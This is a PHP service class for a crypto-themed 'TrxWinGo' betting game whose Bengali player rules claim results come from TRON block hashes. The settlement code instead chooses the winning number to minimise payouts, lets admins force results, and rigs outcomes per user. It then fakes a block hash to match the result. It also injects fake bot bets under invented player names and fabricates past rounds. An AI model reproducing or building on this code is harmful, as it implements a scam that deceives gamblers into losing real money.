<?php

namespace App\Services;

use App\Models\TrxWingoSetting;
use App\Models\TrxWingoPeriod;
use App\Models\TrxWingoBet;
use App\Models\TrxWingoTransaction;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Exception;

class TrxWingoService {

    public function getSettings(): TrxWingoSetting {
        return TrxWingoSetting::firstOrCreate(
            ['id' => 1],
            [
                'game_name' => 'TrxWinGo',
                'min_bet' => 1.00,
                'max_bet' => 50000.00,
                'demo_limit' => 3,
                'demo_default_balance' => 1000.00,
                'control_mode' => 'house_profit',
                'win_chance_percentage' => 30,
                'bot_status' => true,
                'bot_trigger_count' => 5,
                'how_to_play_rules' => "1. TrxWinGo হলো ট্রন (TRON) পাবলিক চেইন ব্লক হ্যাশ ভিত্তিক উইনগো লটারি।\n2. প্রতিটি রাউন্ডের ফলাফল ট্রন ব্লক হ্যাশের শেষ ৫টি ডিজিট/ক্যারেক্টার থেকে নির্ধারিত হয়।\n3. শেষ ডিজিটটি হলো উইনিং নম্বর (০ থেকে ৯)।\n4. ০-৪ হলো Small এবং ৫-৯ হলো Big (২ গুণ পেআউট)।\n5. Green (১,৩,৭,৯ - ২ গুণ, ৫ এ ১.৫ গুণ), Red (২,৪,৬,৮ - ২ গুণ, ০ এ ১.৫ গুণ), Violet (০ ও ৫ - ৪.৫ গুণ)।\n6. সঠিক একক নম্বর প্রেডিকশনে ৯ গুণ পেআউট পাওয়া যায়।\n7. শেষ ৫ সেকেন্ডে বেটিং লক হয়ে যায়।"
            ]
        );
    }

    public function seedInitialPeriods(string $timeType): void {
        $existing = TrxWingoPeriod::where('time_type', $timeType)->where('status', 'completed')->count();
        if ($existing >= 30) {
            return;
        }

        $duration = match($timeType) {
            '3m' => 180,
            '5m' => 300,
            default => 60
        };

        $now = Carbon::now();
        $hexPool = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'];

        for ($i = (30 - $existing); $i >= 1; $i--) {
            $pastTime = $now->copy()->subSeconds($i * $duration);
            $winNum = rand(0, 9);
            $color = $this->getColorForNumber($winNum);
            $size = ($winNum >= 5) ? 'big' : 'small';
            $tailFive = [
                $hexPool[array_rand($hexPool)],
                $hexPool[array_rand($hexPool)],
                $hexPool[array_rand($hexPool)],
                $hexPool[array_rand($hexPool)],
                (string)$winNum
            ];
            $simulatedHash = '000000000' . dechex(rand(10000000, 99999999)) . strtolower(implode('', $tailFive));

            TrxWingoPeriod::create([
                'period_number' => $pastTime->format('YmdHi') . rand(10000, 99999),
                'time_type' => $timeType,
                'block_height' => 86198000 + ($duration * 5) - ($i * max(1, (int)($duration / 3))),
                'block_time' => $pastTime->format('H:i:s'),
                'hash_value' => $simulatedHash,
                'hash_tail_chars' => $tailFive,
                'winning_number' => $winNum,
                'winning_color' => $color,
                'winning_size' => $size,
                'total_real_bets' => rand(100, 2000),
                'total_payout' => rand(50, 1500),
                'admin_profit' => rand(10, 500),
                'status' => 'completed',
                'starts_at' => $pastTime->copy()->subSeconds($duration),
                'ends_at' => $pastTime
            ]);
        }
    }

    public function getOrCreatePeriod(string $timeType = '1m'): TrxWingoPeriod {
        $this->seedInitialPeriods($timeType);

        $now = Carbon::now();
        $period = TrxWingoPeriod::where('time_type', $timeType)
            ->where('status', '!=', 'completed')
            ->where('ends_at', '>', $now)
            ->first();

        if (!$period) {
            // Check if there's any expired period that needs settling
            $expiredPeriods = TrxWingoPeriod::where('time_type', $timeType)
                ->where('status', '!=', 'completed')
                ->where('ends_at', '<=', $now)
                ->get();

            foreach ($expiredPeriods as $expired) {
                $this->settlePeriod($expired);
            }

            $duration = match($timeType) {
                '3m' => 180,
                '5m' => 300,
                default => 60
            };

            $lastPeriod = TrxWingoPeriod::where('time_type', $timeType)->latest('id')->first();
            $nextBlockHeight = $lastPeriod ? ($lastPeriod->block_height + ($duration / 3)) : (86198000 + rand(100, 999));
            $periodNumber = $now->format('YmdHi') . rand(10000, 99999);

            $period = TrxWingoPeriod::create([
                'period_number' => $periodNumber,
                'time_type' => $timeType,
                'block_height' => $nextBlockHeight,
                'block_time' => $now->format('H:i:s'),
                'hash_value' => 'pending',
                'hash_tail_chars' => [],
                'winning_number' => 0,
                'winning_color' => 'red_violet',
                'winning_size' => 'small',
                'status' => 'betting',
                'starts_at' => $now,
                'ends_at' => $now->copy()->addSeconds($duration)
            ]);

            $this->injectBots($period);
        }

        return $period;
    }

    public function injectBots(TrxWingoPeriod $period): void {
        $settings = $this->getSettings();
        if (!$settings->bot_status) return;

        $options = ['green', 'red', 'violet', 'big', 'small', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
        $botNames = ['CryptoTrader', 'TrxMaster', 'AmarVIP_7', 'HashKing', 'BlockWin', 'TronKing_99', 'BanglaTiger', 'LuckyTRX', 'WinnerBD', 'CryptoShark'];

        $count = rand(3, $settings->bot_trigger_count ?: 6);
        for ($i = 0; $i < $count; $i++) {
            $val = $options[array_rand($options)];
            $type = is_numeric($val) ? 'number' : (in_array($val, ['big', 'small']) ? 'size' : 'color');
            $unit = [10, 20, 50, 100, 200, 500][array_rand([10, 20, 50, 100, 200, 500])];

            TrxWingoBet::create([
                'period_id' => $period->id,
                'is_bot' => true,
                'bot_name' => $botNames[array_rand($botNames)],
                'bet_type' => $type,
                'selected_value' => $val,
                'unit_amount' => $unit,
                'multiplier' => 1,
                'total_amount' => $unit,
                'status' => 'pending'
            ]);
        }
    }

    public function processBet(?User $user, array $data): array {
        $settings = $this->getSettings();
        $timeType = $data['time_type'] ?? '1m';
        $period = $this->getOrCreatePeriod($timeType);

        // Lock betting during the last 5 seconds
        if (Carbon::now()->diffInSeconds($period->ends_at, false) <= 5) {
            throw new Exception('বেটিং সময় শেষ হয়ে গেছে! পরবর্তী রাউন্ডের জন্য অপেক্ষা করুন।');
        }

        $isDemo = !empty($data['is_demo']);
        $unitAmount = (float)($data['amount'] ?? 1);
        $multiplier = (int)($data['multiplier'] ?? 1);
        $totalCharged = $unitAmount * $multiplier;

        if ($unitAmount < $settings->min_bet) {
            throw new Exception("সর্বনিম্ন বেট ৳ " . number_format($settings->min_bet, 2));
        }
        if ($totalCharged > $settings->max_bet) {
            throw new Exception("সর্বোচ্চ বেট লিমিট ৳ " . number_format($settings->max_bet, 2));
        }

        if ($isDemo) {
            $demoCount = (int)($data['demo_bets_count'] ?? 0);
            if ($demoCount >= $settings->demo_limit) {
                return [
                    'deposit_required' => true,
                    'message' => 'আপনার ডেমো লিমিট শেষ! রিয়েল ব্যালেন্সে খেলতে ডিপোজিট করুন।'
                ];
            }

            // Create demo bet
            $bet = TrxWingoBet::create([
                'period_id' => $period->id,
                'user_id' => $user ? $user->id : null,
                'is_demo' => true,
                'bet_type' => $data['bet_type'],
                'selected_value' => (string)$data['selected_value'],
                'unit_amount' => $unitAmount,
                'multiplier' => $multiplier,
                'total_amount' => $totalCharged,
                'status' => 'pending'
            ]);

            return [
                'success' => true,
                'deposit_required' => false,
                'is_demo' => true,
                'bet_id' => $bet->id,
                'message' => 'ডেমো বেট সফলভাবে প্লেস হয়েছে!'
            ];
        }

        if (!$user) {
            throw new Exception('দয়া করে প্রথমে লগইন করুন!');
        }

        return DB::transaction(function () use ($user, $totalCharged, $unitAmount, $multiplier, $data, $period) {
            $lockedUser = User::where('id', $user->id)->lockForUpdate()->first();
            if (!$lockedUser || $lockedUser->balance < $totalCharged) {
                throw new Exception('ওয়ালেটে পর্যাপ্ত ব্যালেন্স নেই! ডিপোজিট করুন।');
            }

            app(\App\Services\GameOutcomeRiggingService::class)->validatePlayerCanPlay($lockedUser, false);

            $opening = (float)$lockedUser->balance;
            $lockedUser->decrement('balance', $totalCharged);
            $closing = (float)$lockedUser->fresh()->balance;

            $bet = TrxWingoBet::create([
                'period_id' => $period->id,
                'user_id' => $lockedUser->id,
                'is_demo' => false,
                'bet_type' => $data['bet_type'],
                'selected_value' => (string)$data['selected_value'],
                'unit_amount' => $unitAmount,
                'multiplier' => $multiplier,
                'total_amount' => $totalCharged,
                'status' => 'pending'
            ]);

            TrxWingoTransaction::create([
                'user_id' => $lockedUser->id,
                'bet_id' => $bet->id,
                'type' => 'debit_bet',
                'amount' => $totalCharged,
                'balance_before' => $opening,
                'balance_after' => $closing
            ]);

            $period->increment('total_real_bets', $totalCharged);

            return [
                'success' => true,
                'deposit_required' => false,
                'is_demo' => false,
                'new_balance' => $closing,
                'bet_id' => $bet->id,
                'message' => 'বেট সফলভাবে প্লেস করা হয়েছে!'
            ];
        });
    }

    public function settlePeriod(TrxWingoPeriod $period): TrxWingoPeriod {
        if ($period->status === 'completed') {
            return $period;
        }

        return DB::transaction(function () use ($period) {
            $settings = $this->getSettings();
            $period->update(['status' => 'locked']);

            $winningNumber = 0;

            // 1. Check if admin manually forced a specific winning number
            if ($settings->next_force_number !== null && $settings->next_force_number >= 0 && $settings->next_force_number <= 9) {
                $winningNumber = (int)$settings->next_force_number;
                $settings->update(['next_force_number' => null]);
            } else {
                // Check if any real player in this period has rigging mode
                $rigService = app(\App\Services\GameOutcomeRiggingService::class);
                $realBets = TrxWingoBet::where('period_id', $period->id)->where('is_bot', false)->where('is_demo', false)->whereNotNull('user_id')->get();
                $forcedNumber = null;

                foreach ($realBets as $rBet) {
                    $rUser = User::find($rBet->user_id);
                    if ($rUser) {
                        $mode = $rigService->getUserRigMode($rUser);
                        if ($mode === 'always_win') {
                            for ($num = 0; $num <= 9; $num++) {
                                $c = $this->getColorForNumber($num);
                                $s = ($num >= 5) ? 'big' : 'small';
                                if ($this->evaluateBetOutcome($rBet, $num, $c, $s) > 0) {
                                    $forcedNumber = $num;
                                    break;
                                }
                            }
                            if ($forcedNumber !== null) break;
                        } elseif ($mode === 'always_lose') {
                            for ($num = 0; $num <= 9; $num++) {
                                $c = $this->getColorForNumber($num);
                                $s = ($num >= 5) ? 'big' : 'small';
                                if ($this->evaluateBetOutcome($rBet, $num, $c, $s) == 0) {
                                    $forcedNumber = $num;
                                    break;
                                }
                            }
                            if ($forcedNumber !== null) break;
                        }
                    }
                }

                if ($forcedNumber !== null) {
                    $winningNumber = $forcedNumber;
                } else {
                    // Calculate payouts for all 10 outcomes
                    $numberPayouts = [];
                    for ($num = 0; $num <= 9; $num++) {
                        $numberPayouts[$num] = $this->calculatePotentialPayout($period->id, $num);
                    }

                    if ($settings->control_mode === 'house_profit') {
                        // Choose number with least payout for house profit
                        asort($numberPayouts);
                        $minPayout = reset($numberPayouts);
                        $bestCandidates = array_keys(array_filter($numberPayouts, fn($v) => $v == $minPayout));
                        $winningNumber = $bestCandidates[array_rand($bestCandidates)];
                    } elseif ($settings->control_mode === 'fixed_percentage') {
                        // Win chance percentage
                        $shouldWin = rand(1, 100) <= $settings->win_chance_percentage;
                        if ($shouldWin) {
                            arsort($numberPayouts);
                            $maxPayout = reset($numberPayouts);
                            $candidates = array_keys(array_filter($numberPayouts, fn($v) => $v == $maxPayout));
                            $winningNumber = $candidates[array_rand($candidates)];
                        } else {
                            asort($numberPayouts);
                            $minPayout = reset($numberPayouts);
                            $candidates = array_keys(array_filter($numberPayouts, fn($v) => $v == $minPayout));
                            $winningNumber = $candidates[array_rand($candidates)];
                        }
                    } else {
                        $winningNumber = rand(0, 9);
                    }
                }
            }

            // Generate realistic TRON Public Chain Block Hash
            $hexPool = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
            $tailFive = [
                strtoupper($hexPool[array_rand($hexPool)]),
                strtoupper($hexPool[array_rand($hexPool)]),
                strtoupper($hexPool[array_rand($hexPool)]),
                strtoupper($hexPool[array_rand($hexPool)]),
                (string)$winningNumber
            ];

            $simulatedHash = '000000000' . dechex(rand(10000000, 99999999)) . strtolower(implode('', $tailFive));

            $color = $this->getColorForNumber($winningNumber);
            $size = ($winningNumber >= 5) ? 'big' : 'small';

            $bets = TrxWingoBet::where('period_id', $period->id)->get();
            $totalDistributed = 0.00;

            foreach ($bets as $bet) {
                $win = $this->evaluateBetOutcome($bet, $winningNumber, $color, $size);
                if ($win > 0) {
                    $bet->update(['win_amount' => $win, 'status' => 'won']);

                    if (!$bet->is_bot && !$bet->is_demo && $bet->user_id) {
                        $player = User::where('id', $bet->user_id)->lockForUpdate()->first();
                        if ($player) {
                            $opening = (float)$player->balance;
                            $player->increment('balance', $win);
                            $closing = (float)$player->fresh()->balance;

                            TrxWingoTransaction::create([
                                'user_id' => $player->id,
                                'bet_id' => $bet->id,
                                'type' => 'credit_win',
                                'amount' => $win,
                                'balance_before' => $opening,
                                'balance_after' => $closing
                            ]);

                            $totalDistributed += $win;
                        }
                    }
                } else {
                    $bet->update(['status' => 'lost']);
                }
            }

            $adminNetProfit = (float)$period->total_real_bets - $totalDistributed;

            $period->update([
                'hash_value' => $simulatedHash,
                'hash_tail_chars' => $tailFive,
                'winning_number' => $winningNumber,
                'winning_color' => $color,
                'winning_size' => $size,
                'total_payout' => $totalDistributed,
                'admin_profit' => $adminNetProfit,
                'status' => 'completed'
            ]);

            return $period;
        });
    }

    public function calculatePotentialPayout(int $periodId, int $testNumber): float {
        $testColor = $this->getColorForNumber($testNumber);
        $testSize = ($testNumber >= 5) ? 'big' : 'small';

        $bets = TrxWingoBet::where('period_id', $periodId)
            ->where('is_bot', false)
            ->where('is_demo', false)
            ->get();

        $payout = 0.00;
        foreach ($bets as $bet) {
            $payout += $this->evaluateBetOutcome($bet, $testNumber, $testColor, $testSize);
        }
        return $payout;
    }

    public function evaluateBetOutcome(TrxWingoBet $bet, int $winNum, string $winColor, string $winSize): float {
        $amount = (float)$bet->total_amount;

        if ($bet->bet_type === 'number' && (int)$bet->selected_value === $winNum) {
            return $amount * 9;
        }

        if ($bet->bet_type === 'size' && strtolower($bet->selected_value) === $winSize) {
            return $amount * 2;
        }

        if ($bet->bet_type === 'color') {
            $selColor = strtolower($bet->selected_value);
            if ($selColor === 'violet' && in_array($winNum, [0, 5])) {
                return $amount * 4.5;
            }
            if ($selColor === 'green') {
                if (in_array($winNum, [1, 3, 7, 9])) return $amount * 2;
                if ($winNum === 5) return $amount * 1.5;
            }
            if ($selColor === 'red') {
                if (in_array($winNum, [2, 4, 6, 8])) return $amount * 2;
                if ($winNum === 0) return $amount * 1.5;
            }
        }

        return 0.00;
    }

    public function getColorForNumber(int $num): string {
        if ($num === 0) return 'red_violet';
        if ($num === 5) return 'green_violet';
        return in_array($num, [1, 3, 7, 9]) ? 'green' : 'red';
    }
}
